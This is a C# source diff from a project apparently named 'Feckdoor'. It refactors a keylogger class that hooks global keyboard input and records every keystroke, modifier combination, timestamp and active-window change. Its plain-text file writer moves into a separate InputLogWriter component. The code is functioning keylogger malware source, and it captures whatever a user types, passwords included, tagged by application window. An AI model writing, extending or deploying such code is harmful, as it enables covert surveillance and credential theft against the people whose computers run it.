@@ -4,66 +4,17 @@ using System.Text;
 
 namespace Feckdoor.InputLog
 {
-	public class InputLogger : IDisposable
+	public class KeyboardLogger : IDisposable
 	{
-		private static ActiveWindowInfo ActiveWindowInfoCache;
+		private static readonly string[] ModifierKeysString = { "CTRL", "SHIFT", "ALT", "WIN" };
+		private ActiveWindowInfo ActiveWindowInfoCache;
+		private readonly Stopwatch TimestampAppend = new();
 
-		internal static readonly Queue<InputLogEntry> UndoneQueue = new();
-		private readonly Stopwatch PreviousInput = new();
-
-		private readonly Task WriterTask;
-
-		private readonly string[] ModifierKeysString = { "CTRL", "SHIFT", "ALT", "WIN" };
-
-		private volatile bool InputWriterRunning = true;
 		private bool disposed;
 
-		public InputLogger()
+		public KeyboardLogger()
 		{
 			KeyboardHook.OnKeyboardInput += OnKeyboardInput;
-			WriterTask = Task.Run(async () =>
-			{
-				while (InputWriterRunning)
-				{
-					if (PreviousInput.ElapsedMilliseconds > Config.TheConfig.InputLog.SaveWait && UndoneQueue.Count > 0 || UndoneQueue.Count >= Config.TheConfig.InputLog.SaveMaxUndone)
-						WriteUndone(Config.TheConfig.InputLog.InputLogFile);
-
-					await Task.Delay(Config.TheConfig.InputLog.SaveDelay);
-				}
-
-				// Final write (before shutdown)
-				WriteUndone(Config.TheConfig.InputLog.InputLogFile);
-			});
-		}
-
-		internal void WriteUndone(string inputLogFile)
-		{
-			Log.Debug("Writing input log.");
-
-			try
-			{
-				var queueCopy = new List<InputLogEntry>(UndoneQueue);
-				UndoneQueue.Clear();
-
-				// current sqlite db is not supported
-
-				using var writer = new StreamWriter(inputLogFile, true, Encoding.UTF8);
-				foreach (var entry in queueCopy)
-				{
-					try
-					{
-						writer.Write(entry.PlainTextMessage);
-					}
-					catch (Exception e)
-					{
-						Log.Warning(e, "Exception during writing a input log entry.");
-					}
-				}
-			}
-			catch (Exception e)
-			{
-				Log.Error(e, "Exception during writing input log.");
-			}
 		}
 
 		internal void OnKeyboardInput(object? sender, KeyboardInputEventArgs args)
@@ -97,14 +48,22 @@ namespace Feckdoor.InputLog
 				modifierSet.Add('#');
 
 			if (modifierSet.Count > 0)
-				currentKey = $"{string.Concat(modifierSet)}{currentKey}";
+				currentKey = string.Concat(modifierSet) + currentKey;
 
 			if (ActiveWindowInfoCache != GetActiveWindowInfo())
-				UndoneQueue.Enqueue(new ActiveWindowChangeEntry(DateTime.Now, ActiveWindowInfoCache));
+			{
+				InputLogWriter.Push(new ActiveWindowChangeEntry(DateTime.Now, ActiveWindowInfoCache));
+				TimestampAppend.Restart();
+			}
 
-			UndoneQueue.Enqueue(new KeyLogEntry(DateTime.Now.AddTicks(Environment.TickCount64 - args.Time), args, currentKey));
+			// TODO: Disable this when logging mode set to SQLite
+			if (TimestampAppend.ElapsedMilliseconds >= Config.TheConfig.InputLog.PlainText.TimestampDelay)
+				InputLogWriter.Push(new TimestampEntry(DateTime.Now, Config.TheConfig.InputLog.PlainText.TimestampFormat));
 
-			PreviousInput.Restart();
+			InputLogWriter.Push(new KeyLogEntry(DateTime.Now.AddTicks(Environment.TickCount64 - args.Time), args, currentKey));
+
+			InputLogWriter.NotifyInput();
+			TimestampAppend.Restart();
 		}
 
 		private static string Vk2String(uint vkCode, uint scanCode, bool altDown)
@@ -133,7 +92,7 @@ namespace Feckdoor.InputLog
 			return ((VirtualKey)vkCode).ToString();
 		}
 
-		private static ActiveWindowInfo GetActiveWindowInfo()
+		private ActiveWindowInfo GetActiveWindowInfo()
 		{
 			try
 			{
@@ -160,11 +119,7 @@ namespace Feckdoor.InputLog
 			if (!disposed)
 			{
 				if (disposing)
-				{
 					KeyboardHook.OnKeyboardInput -= OnKeyboardInput;
-					InputWriterRunning = false;
-					WriterTask.Wait(); // Wait until the last save finishes
-				}
 
 				disposed = true;
 			}
